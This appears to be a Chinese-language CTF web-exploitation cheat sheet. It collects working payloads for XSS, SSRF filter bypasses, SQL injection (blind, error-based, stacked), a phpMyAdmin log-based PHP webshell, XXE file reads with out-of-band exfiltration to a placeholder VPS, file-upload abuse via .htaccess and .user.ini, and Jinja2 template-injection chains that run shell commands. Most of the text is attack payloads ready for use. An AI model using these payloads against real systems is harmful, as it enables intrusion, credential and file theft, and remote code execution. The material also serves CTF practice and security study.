<p>这道题目过滤<code>\n</code>或<code>\r</code>，但是ECMA-262标准中，还有其他的换行符<br><img src="https://i.loli.net/2019/10/15/btWyJmw3Q7o4XMO.png" alt></p>
<p>所以unicode中<code>\u{2028}</code>也可用作换行，后端服务器不会解码<code>%E2%80%A8</code>，前端浏览器会把它当作实心点号解析，但其实是换行的标志位。<br><img src="http://static.zybuluo.com/1160307775/bjypn0138ruhused6961m45f/image_1dnej0u2r1ocr1fnc5f71hu81l33m.png" alt="image_1dnej0u2r1ocr1fnc5f71hu81l33m.png-11.1kB"></p>
<p>那么上面的payload最终的形式应该是这样:</p>
<pre><code>https://hpdoger.cn/?&quot;%2beval(atob(`ZG9jdW1lbnQuY29va2ll`))%E2%80%A8--&gt;</code></pre><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="常见题型"><a href="#常见题型" class="headerlink" title="常见题型"></a>常见题型</h2><h3 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h3><p>前提是:<br>1、已知mysql的账号密码(大概率通过php文件泄漏的方式)<br>2、存在ssrf</p>
<p>原理都是利用SSRF拿Gopher协议发送构造好的TCP/IP数据包攻击mysql</p>
<p>相关文章：<br><a href="https://yinwc.github.io/2018/07/31/Gopher/" target="_blank" rel="noopener">https://yinwc.github.io/2018/07/31/Gopher/</a><br><a href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL" target="_blank" rel="noopener">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/#GopherMySQL</a></p>
<p>不去抓本地包再构造，有一个自动生成poc的工具：<a href="https://github.com/undefinedd/extract0r-" target="_blank" rel="noopener">https://github.com/undefinedd/extract0r-</a></p>
<h2 id="过滤指定字符串"><a href="#过滤指定字符串" class="headerlink" title="过滤指定字符串"></a>过滤指定字符串</h2><p>用unicode编码绕过localhost的限制</p>
<pre><code>LocalHost = localhost = ⓛocaⓛhost </code></pre><h2 id="常见绕过"><a href="#常见绕过" class="headerlink" title="常见绕过"></a>常见绕过</h2><h3 id="host白名单"><a href="#host白名单" class="headerlink" title="host白名单"></a>host白名单</h3><p>检测host是不是含有白名单如<code>baidu.com</code>，可以用两种方法：</p>
<p>1、data://协议，php不关心MIME类型，所以可以把baidu.com放到MIME类型里</p>
<pre><code>data://baidu.com/plain;base64,xxxxxx</code></pre><p>xxx是我们想让服务器解析的明文字符串，以base64的方式编码</p>
<p>2、orange的思路</p>
<pre><code>http://foo@127.0.0.1:80@baidu.com/flag.php</code></pre><p>curl请求的是127.0.0.1，而baidu.com是题目的白名单</p>
<h3 id="指定后缀名绕过-仅限于curl产生的ssrf"><a href="#指定后缀名绕过-仅限于curl产生的ssrf" class="headerlink" title="指定后缀名绕过(仅限于curl产生的ssrf)"></a>指定后缀名绕过(仅限于curl产生的ssrf)</h3><p>例如下面这种情况，指定必须为jpg后缀时，可以用<code>file:///flag.php?.jpg</code>也可以读到<code>/flag.php</code>文件，详情见文章:<a href="https://xz.aliyun.com/t/7112" target="_blank" rel="noopener">浅析SSRF与文件读取的一些小特性</a></p>
<pre><code>&lt;?php
var_dump(ini_get(&#39;allow_url_fopen&#39;));
$url = $_POST[&#39;url&#39;];
$url = $url . &#39;.jpg&#39;;
var_dump($url);

if(function_exists(&#39;curl_init&#39;) &amp;&amp; function_exists(&#39;curl_exec&#39;)){
    $ch = curl_init($url);
    $data = &#39;&#39;;
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $data = curl_exec($ch);
    curl_close($ch);
    var_dump($data);
}
?&gt;</code></pre><h2 id="IP地址转换绕过"><a href="#IP地址转换绕过" class="headerlink" title="IP地址转换绕过"></a>IP地址转换绕过</h2><h3 id="常规的思路"><a href="#常规的思路" class="headerlink" title="常规的思路"></a>常规的思路</h3><p>数字地址(十进制)：127.0.0.1-&gt;2130706433<br>十六进制：127.0.0.1-&gt;0x7F000001或0x7F.00.00.01或0x7F.0x00.0x00.0x01<br>八进制： 127.0.0.1-&gt;0177.0.0.1或0177.00.00.01<br>省略写法：127.0.0.1-&gt;127.1</p>
<p>或者利用xio.io</p>
<pre><code>127.0.0.1.xip.io
www.127.0.0.1.xip.io
xxx.127.0.0.1.xip.io
fuzz.xxx.127.0.0.1.xip.io</code></pre><h3 id="骚姿势"><a href="#骚姿势" class="headerlink" title="骚姿势"></a>骚姿势</h3><p>之前在吐司学的一招实战用：如果302跳转(准确的说是http协议)禁用IPV4的规则传入，可以用IPV6绕过：</p>
<pre><code>http://[::ffff:127.0.0.1]/
也可以缩写成 http://[::1]/</code></pre><h2 id="check内网ip段绕过"><a href="#check内网ip段绕过" class="headerlink" title="check内网ip段绕过"></a>check内网ip段绕过</h2><p>php过滤代码如下</p>
<pre><code>    $hostname=$url_parse[&#39;host&#39;]; 
    $ip=gethostbyname($hostname); 
    $int_ip=ip2long($ip);
    return ip2long(&#39;127.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;10.0.0.0&#39;)&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long(&#39;172.16.0.0&#39;)&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long(&#39;192.168.0.0&#39;)&gt;&gt;16 == $int_ip&gt;&gt;16; </code></pre><p>用ip2long和parse_url来check请求是否包含内网ip段，则可以用以下方法绕过</p>
<pre><code>1. http://0.0.0.0/flag.php
2. http://foo@127.0.0.1:80@baidu.com/flag.php
3. http://%5B::%5D:22/</code></pre><p>第一种是对于0.0.0.0掩码绕过<br>第二种白名单是baidu.com，黑名单是127x网段<br>第三种是绕过主机名探测，用[::]替代127.0.0.1</p>
<h2 id="file协议妙用"><a href="#file协议妙用" class="headerlink" title="file协议妙用"></a>file协议妙用</h2><p>我们可以通过 file:///proc/self/cwd/index.php 获得index.php文件。在linux中，每个进程都有一个PID，而/proc/xxx/下存放着与该进程相关的信息（这里的xxx就是PID）。/proc/xxx/下的cwd是软链接，self表示本进程。当我们通过访问Apache运行的网站时，/proc/self/cwd/就相当于apache的根目录，例如我本机Apache的根目录是/var/www/html</p>
<p><img src="http://static.zybuluo.com/1160307775/osyc4y4bkxtkyuy286wrpuh0/image_1ddqj7884117n43j19vu1rgn347p.png" alt="image_1ddqj7884117n43j19vu1rgn347p.png-54.3kB"></p>
<h3 id="arp表"><a href="#arp表" class="headerlink" title="arp表"></a>arp表</h3><p><code>proc/net/arp</code></p>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>sql语句查询mysql操作日志:<a href="http://www.cnblogs.com/jhin-wxy/p/8965888.html" target="_blank" rel="noopener">http://www.cnblogs.com/jhin-wxy/p/8965888.html</a></p>
<p>mysql5.7文档:<a href="https://dev.mysql.com/doc/" target="_blank" rel="noopener">https://dev.mysql.com/doc/</a></p>
<h2 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h2><ul>
<li>查询所有的数据库:<pre><code>select group_concat(schema_name) from  information_schema.schemata</code></pre></li>
<li>查询数据表:<pre><code>select group_concat(table_name) from  information_schema.tables where table_schema = database()</code></pre></li>
<li>查询字段:<pre><code>select group_concat(column_name) from  information_schema.columns where table_name = &#39;user&#39;</code></pre></li>
</ul>
<h2 id="盲注语句"><a href="#盲注语句" class="headerlink" title="盲注语句"></a>盲注语句</h2><h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>可以用python3的模块string打印所有字母和符号</p>
<pre><code>import string

for c in string.printable</code></pre><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><pre><code>and ascii(substr(database(),1,1))&gt;?</code></pre><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>五种造成延时的方法:<a href="https://www.smi1e.top/sql%e6%b3%a8%e5%85%a5%e7%ac%94%e8%ae%b0/[https://www.cdxy.me/?p=789](https://www.cdxy.me/?p=789)" target="_blank" rel="noopener">MySQL时间盲注五种延时方法</a></p>
<p>推荐sleep、benchmark</p>
<p><img src="http://static.zybuluo.com/1160307775/ggkko75qnyhcasecsp27sqmz/image_1dgk48rf11ka11ehqo7b6hl8eu19.png" alt="image_1dgk48rf11ka11ehqo7b6hl8eu19.png-33kB"></p>
<p>配合if使用效果极佳</p>
<pre><code>if(expr1,expr2,sleep(10))</code></pre><p>如果 expr1 为真，则if函数执行expr2语句; 否则执行sleep语句。</p>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p>
<pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p>
<h2 id="堆叠注入-经典union被过滤"><a href="#堆叠注入-经典union被过滤" class="headerlink" title="堆叠注入(经典union被过滤)"></a>堆叠注入(经典union被过滤)</h2><p>PHP中如果使用PDO的连接形式则可能产生堆叠注入</p>
<pre><code>$con = &quot;mysql:host=localhost;port=3306;dbname=acg&quot;;
$conn = new PDO($con, &#39;root&#39;, &#39;nihao123&#39;);</code></pre><h3 id="不用select查询字段值"><a href="#不用select查询字段值" class="headerlink" title="不用select查询字段值"></a>不用select查询字段值</h3><p>前提条件是允许执行多条sql语句(即multi模式)</p>
<h4 id="mysql的预查询"><a href="#mysql的预查询" class="headerlink" title="mysql的预查询"></a>mysql的预查询</h4><p>用SET方法设置一个全局变量值为”select xxx from xx”,再用预编译执行这个全局变量</p>
<pre><code>SET+@hpdoger=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+hpdoger+from+@hpdoger;execute+hpdoger;#

SET @SQL=0x494E5345525420494E544F206D6F76696520286E616D652C20636F6E74656E74292056414C55455320282761616161272C27616161612729;PREPARE pord FROM @SQL;EXECUTE pord;</code></pre><p>此时全局变量@hpdoger的值就是</p>
<pre><code>select flag from xxxx;</code></pre><p><img src="http://static.zybuluo.com/1160307775/cmk9b5q0q1qazpnmyyv55oq0/image_1ds4s6841ke71dm0ord1e8t14uf9.png" alt="image_1ds4s6841ke71dm0ord1e8t14uf9.png-60.2kB"></p>
<p>后面用预编译执行全局变量是因为：想要执行全局变量的前提是有Select语句，但是预编译就不需要，即我们可以用<code>EXECUTE</code>来执行</p>
<h4 id="使用handler"><a href="#使用handler" class="headerlink" title="使用handler"></a>使用handler</h4><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a></p>
<h3 id="当set被过滤"><a href="#当set被过滤" class="headerlink" title="当set被过滤"></a>当set被过滤</h3><p>上面提到的是用<code>SET @hpdoger</code>来设置变量，如果select没被过滤的话，还可以用<code>select @hpdoger:=0x巴拉巴拉</code>来设置变量，详情见：<a href="https://blog.csdn.net/JesseYoung/article/details/40779631" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40779631</a></p>
<p>所以上面的预处理语句还可以转换成下面的用法:</p>
<pre><code>select @hpdoger:=0x73656c656374202a2066726f6d2075736572;PREPARE pord FROM @hpdoger;EXECUTE pord;</code></pre><p><img src="http://static.zybuluo.com/1160307775/yb25h693ft4hw84tle8b5zfp/image_1ds4tb8gk1kpe1m1matr9um1bfsm.png" alt="image_1ds4tb8gk1kpe1m1matr9um1bfsm.png-78.1kB"></p>
<h2 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h2><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="过滤了”in”或者”or”"><a href="#过滤了”in”或者”or”" class="headerlink" title="过滤了”in”或者”or”"></a>过滤了”in”或者”or”</h3><p>查库名可以用一种新的方式，但是会显示所有存在数据的表名</p>
<pre><code>select table_schema from sys.x$schema_flattened_keys;</code></pre><p>查所有的数据表</p>
<pre><code>select table_name from sys.schema_table_statistics limit 0,5;</code></pre><p><img src="http://static.zybuluo.com/1160307775/7h75uvzqq9oez5b08huxcf77/image_1du2onu9nvd33131qsq18fftfh9.png" alt="image_1du2onu9nvd33131qsq18fftfh9.png-44.9kB"></p>
<h2 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h2><h3 id="phpmyadmin日志getshell"><a href="#phpmyadmin日志getshell" class="headerlink" title="phpmyadmin日志getshell"></a>phpmyadmin日志getshell</h3><ol>
<li>使用url报错爆出绝对路径，再尝试用sql写shell<pre><code>/phpMyAdmin/index.php?lang[]=1</code></pre></li>
</ol>
<p>2.查general_log的路径，与是否开启日志记录功能</p>
<pre><code>SHOW+GLOBAL+VARIABLES+LIKE+&#39;general_log%&#39;</code></pre><ol start="2">
<li>接着执行sql语句，木马就是日志文件<pre><code>SET GLOBAL general_log=&#39;on&#39;;
SET GLOBAL general_log_file=&#39;C:/phpStudy/www/xxx.php&#39;; # 可自定义
SELECT &#39;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#39;;</code></pre></li>
</ol>
<h3 id="GETSHELL总结"><a href="#GETSHELL总结" class="headerlink" title="GETSHELL总结"></a>GETSHELL总结</h3><p><a href="https://xz.aliyun.com/t/2460" target="_blank" rel="noopener">https://xz.aliyun.com/t/2460</a></p>
<h2 id="MYSQL5-7以后的一些特性"><a href="#MYSQL5-7以后的一些特性" class="headerlink" title="MYSQL5.7以后的一些特性"></a>MYSQL5.7以后的一些特性</h2><p>增加了很多报错函数</p>
<pre><code>ST_LatFromGeoHash()ST_LongFromGeoHash()GTID_SUBSET()GTID_SUBTRACT()ST_PointFromGeoHash()</code></pre><pre><code>mysql&gt; select ST_LatFromGeoHash(version());</code></pre><p>information_schema被过滤掉的话，可以用Innob来绕过</p>
<h1 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h1><h2 id="外部实体常用poc"><a href="#外部实体常用poc" class="headerlink" title="外部实体常用poc"></a>外部实体常用poc</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h2 id="参数实体常用poc"><a href="#参数实体常用poc" class="headerlink" title="参数实体常用poc"></a>参数实体常用poc</h2><p>外部引入参数实体的例子：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
&lt;!DOCTYPE a [
    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;
    %name;
]&gt;</code></pre><h2 id="参数实体调用的错误示范"><a href="#参数实体调用的错误示范" class="headerlink" title="参数实体调用的错误示范"></a>参数实体调用的错误示范</h2><p>第一种，错误原因：<strong>XML解析器都不会解析同级参数实体的内容</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt; 
    %send;
]&gt;</code></pre><p>第二种虽然不同级，但直接请求也会发生错误。错误原因：<strong>禁止在内部ENTITY中引用参数实体，但是支持在外部声明的dtd中引入，因此我们可以把下面的payload作为外部dtd文件使用</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
    %start;
    %send;
]&gt;</code></pre><h2 id="引入外部dtd文件-amp-OOB-读取本地文件"><a href="#引入外部dtd文件-amp-OOB-读取本地文件" class="headerlink" title="引入外部dtd文件&amp;OOB-读取本地文件"></a>引入外部dtd文件&amp;OOB-读取本地文件</h2><p>直接发起的xxe请求如下，或者以xml文件的形式放在vps(前提XXE可以解析这个xml文件)</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;

&lt;!DOCTYPE ANY[

&lt;!ENTITY % send SYSTEM &#39;http://your_vps/test2.dtd&#39;&gt;

%send;
%test;
%back;
]&gt;</code></pre><p>vps上的外部DTD声明文件test2.dtd如下，读取文件并发送请求ood到自己的vps：</p>
<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;

&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &#39;http://your_vps/?file=%file;&#39;&gt;&quot;&gt;</code></pre><h2 id="引入外部dtd文件-amp-报错回显-读取本地文件"><a href="#引入外部dtd文件-amp-报错回显-读取本地文件" class="headerlink" title="引入外部dtd文件&amp;报错回显-读取本地文件"></a>引入外部dtd文件&amp;报错回显-读取本地文件</h2><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据。</p>
<p>所以和OOB的构造方式几乎只有url出不同，其他地方一模一样。</p>
<p><img src="http://static.zybuluo.com/1160307775/o09e0gt16woeslut7mcjthgm/image_1def8qqag1frb1pfu1ghq1lkvbhf9.png" alt="image_1def8qqag1frb1pfu1ghq1lkvbhf9.png-81.8kB"></p>
<h2 id="无需引入外部dtd文件-三层嵌套文件读取"><a href="#无需引入外部dtd文件-三层嵌套文件读取" class="headerlink" title="无需引入外部dtd文件-三层嵌套文件读取"></a>无需引入外部dtd文件-三层嵌套文件读取</h2><p>W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  
    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://myip/?%file;&#39;&gt;&quot;&gt;
    %start;
    %send;
]&gt;
&lt;message&gt;10&lt;/message&gt;</code></pre><p>但是对于三层嵌套参数实体构造的payload有些XML解析器是无法检测出来的，比如我本次测试的两种组合php7.2 + libxml2 2.9.4版本和php5.4 + libxml2 2.9.1都是可以有效利用的</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ELEMENT message ANY&gt;
    &lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;
    &lt;!ENTITY % para &#39;
        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;para2;
    &#39;&gt;
    %para;
]&gt;
&lt;message&gt;10&lt;/message&gt;</code></pre><p>这意味着，无需引用外部dtd也可以实现Blind XXE。</p>
<h2 id="利用本地xxe来bypass协议不回显的情况"><a href="#利用本地xxe来bypass协议不回显的情况" class="headerlink" title="利用本地xxe来bypass协议不回显的情况"></a>利用本地xxe来bypass协议不回显的情况</h2><p><a href="https://xz.aliyun.com/t/5503" target="_blank" rel="noopener">https://xz.aliyun.com/t/5503</a></p>
<p><a href="https://www.jishuwen.com/d/2EGU" target="_blank" rel="noopener">https://www.jishuwen.com/d/2EGU</a></p>
<h3 id="dtd-1"><a href="#dtd-1" class="headerlink" title="dtd-1"></a>dtd-1</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE message [
    &lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;
    &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;
    &lt;!ENTITY % ISOamso &#39;
        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;eval;
        &amp;#x25;send;
    &#39;&gt; 
    %remote;
]&gt;</code></pre><h3 id="javaweb-的本地xxe"><a href="#javaweb-的本地xxe" class="headerlink" title="javaweb 的本地xxe"></a>javaweb 的本地xxe</h3><pre><code>&lt;!DOCTYPE message [
    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;

    &lt;!ENTITY % expr &#39;aaa)&gt;
        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///FILE_TO_READ&quot;&gt;
        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;
        &amp;#x25;eval;
        &amp;#x25;error;
        &lt;!ELEMENT aa (bb&#39;&gt;

    %local_dtd;
]&gt;
&lt;message&gt;&lt;/message&gt;</code></pre><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="骚姿势-1"><a href="#骚姿势-1" class="headerlink" title="骚姿势"></a>骚姿势</h2><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>见SSRF-File协议妙用</p>
<h3 id="dev-文件读写io"><a href="#dev-文件读写io" class="headerlink" title="/dev-文件读写io"></a>/dev-文件读写io</h3><p>当一个文件被打开时，此时/dev/fd下就存在读写的文件描述符，通过<code>include</code>就能把文件读出来。具体见下面的场景</p>
<pre><code>&lt;?php
  $fp = fopen(&quot;/tmp/flag.txt&quot;, &quot;r&quot;);
  if($_SERVER[&#39;REQUEST_METHOD&#39;] === &#39;GET&#39; &amp;&amp; isset($_GET[&#39;include&#39;]) &amp;&amp; strlen($_GET[&#39;include&#39;]) &lt;= 10) {
    include($_GET[&#39;include&#39;]);
  }
  fclose($fp);
  echo highlight_file(__FILE__, true);
?&gt;</code></pre><p>解法:<code>include=/dev/fd/11</code>，描述符不一定是11，可能是4-x中的任意数字</p>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h2><pre><code>1、改content-type?
2、是否存在解析漏洞 .php.xxx
3、是否可以上传其它能解析的后缀？
4、存在二次渲染漏洞？imagecreatfrompng
5、apache2.4是否存在0a换行绕过？
6、htaccess、.user.ini是否可以上传？</code></pre><h2 id="妙用-htaccess"><a href="#妙用-htaccess" class="headerlink" title="妙用.htaccess"></a>妙用.htaccess</h2><p>有个.htaccess所有用法合集:<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" target="_blank" rel="noopener">PHP htaccess injection cheat sheet</a></p>
<p>apache中的.htaccess</p>
<p>将同目录下的jpg解析为php,文件内容如下</p>
<pre><code>AddType application/x-httpd-php .jpg</code></pre><h2 id="妙用-user-ini"><a href="#妙用-user-ini" class="headerlink" title="妙用.user.ini"></a>妙用.user.ini</h2><p>.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p>
<p>当一个文件夹下有php</p>
<pre><code>php_value auto_prepend_file = f13g.php</code></pre><h2 id="php-写文件"><a href="#php-写文件" class="headerlink" title="php/.写文件"></a>php/.写文件</h2><p>后缀给<code>php/.</code>，在函数操作的时候也可以存为php<br><img src="http://static.zybuluo.com/1160307775/00ryfouierckkzrm1apw6qop/image_1dikffg1ciuv185fg3v17661m9vp.png" alt="image_1dikffg1ciuv185fg3v17661m9vp.png-83.5kB"></p>
<p>目前测试copy、file_get_contents都可以</p>
<h1 id="模版注入"><a href="#模版注入" class="headerlink" title="模版注入"></a>模版注入</h1><h2 id="Python-Jinja2引擎"><a href="#Python-Jinja2引擎" class="headerlink" title="Python-Jinja2引擎"></a>Python-Jinja2引擎</h2><h3 id="SSTI存在-amp-不存在"><a href="#SSTI存在-amp-不存在" class="headerlink" title="SSTI存在&amp;不存在"></a>SSTI存在&amp;不存在</h3><p>后端如果使用<code>request.url</code>，则会把传递的参数编码，而<code>request.args.get</code>依然存在SSTi的问题。</p>
<h3 id="常见攻击流程"><a href="#常见攻击流程" class="headerlink" title="常见攻击流程"></a>常见攻击流程</h3><p>入门引导:<a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">https://xz.aliyun.com/t/3679</a></p>
<p>Python模版注入的解题思路就是：通过<code>__class__</code>属性找到基类object，通过<code>__subclasses__()</code>查看object中有哪些类可以利用，一般都是去寻找os类、然后通过<code>__globals__</code>全局来查找所有的方法及变量及参数，通常用到<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类的<code>popen</code>方法。</p>
<p>调用链大致如下：</p>
<pre><code>http://127.0.0.1:5000/test?{{"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen'](''cat+/flag').read()}}</code></pre><h3 id="执行多行Python语句"><a href="#执行多行Python语句" class="headerlink" title="执行多行Python语句"></a>执行多行Python语句</h3><p>具体见P神vulhub的用法:<a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}</code></pre><h3 id="寻找可RCE的类"><a href="#寻找可RCE的类" class="headerlink" title="寻找可RCE的类"></a>寻找可RCE的类</h3><pre><code>cnt=0
for item in [].__class__.__base__.__subclasses__():
    try:
        if &#39;os&#39; in item.__init__.__globals__:
            print cnt,item
        cnt+=1
    except:
        print &quot;error&quot;,cnt,item
        cnt+=1
        continue</code></pre><p>第二种</p>
<pre><code>#!/usr/bin/env python
# encoding: utf-8

cnt=0
for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():
    try:
        cnt2=0
        for i in item.__init__.__globals__:
            if &#39;eval&#39; in item.__init__.__globals__[i]:
                print cnt,item,cnt2,i
            cnt2+=1
        cnt+=1
    except:
        print &quot;error&quot;,cnt,item
        cnt+=1
        continue</code></pre><h3 id="过滤bypass"><a href="#过滤bypass" class="headerlink" title="过滤bypass"></a>过滤bypass</h3><p>过滤了下划线可以考虑用动态传参绕过</p>
<pre><code>name={{request[request.args.param]}}&amp;param=__class__</code></pre><p>过滤中括号可以直接用”.”来代替属性，圆括号代替下标选择</p>
<pre><code>{{""|attr(request.args.param)|attr(request.args.mro)|attr(request.args.sub)()|attr(request.args.item)(77)|attr(request.args.ini)|attr(request.args.glo)}}&amp;param=__class__&amp;mro=__base__&amp;sub=__subclasses__&amp;item=__getitem__&amp;ini=__init__&amp;glo=__globals__</code></pre><p>过滤了双引号或者点号，可以用|来绕过，|是过滤器<br><img src="http://static.zybuluo.com/1160307775/8c4ksg2ynr1y0pix9ydlya9a/image_1dnp4tbpur791ed1agc189d14cp.png" alt="image_1dnp4tbpur791ed1agc189d14cp.png-91.2kB"></p>
<h2 id="相关链接-1"><a href="#相关链接-1" class="headerlink" title="相关链接"></a>相关链接</h2><p><a href="https://xz.aliyun.com/t/3679#toc-0" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a></p>
<p>很详细的一篇文章：<a href="https://www.anquanke.com/post/id/188172#h2-0" target="_blank" rel="noopener">SSTI/沙盒逃逸详细总结</a></p>
<p><a href="https://www.xmsec.cc/ssti-and-bypass-sandbox-in-jinja2/" target="_blank" rel="noopener">从SSTI到沙箱逃逸-jinja2</a></p>
<p><a href="https://blog.szfszf.top/tech/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8E%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5ssti%E4%BA%8C/" target="_blank" rel="noopener">Python沙箱逃逸与模板注入SSTI</a></p>
<p><a href="http://docs.jinkan.org/docs/jinja2/templates.html#builtin-filters" target="_blank" rel="noopener">模板设计者文档</a></p>
<h1 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><ul>
<li><p>php://input<br><img src="http://static.zybuluo.com/1160307775/bm2tqiqmypmrpzaszatv1w0t/image_1d83kt9ffd621pod1p0o62e125m.png" alt="image_1d83kt9ffd621pod1p0o62e125m.png-121kB"></p>
</li>
<li><p>php://filter</p>
<pre><code>file=php://filter/read=convert.base64-encode/resource=index.php</code></pre></li>
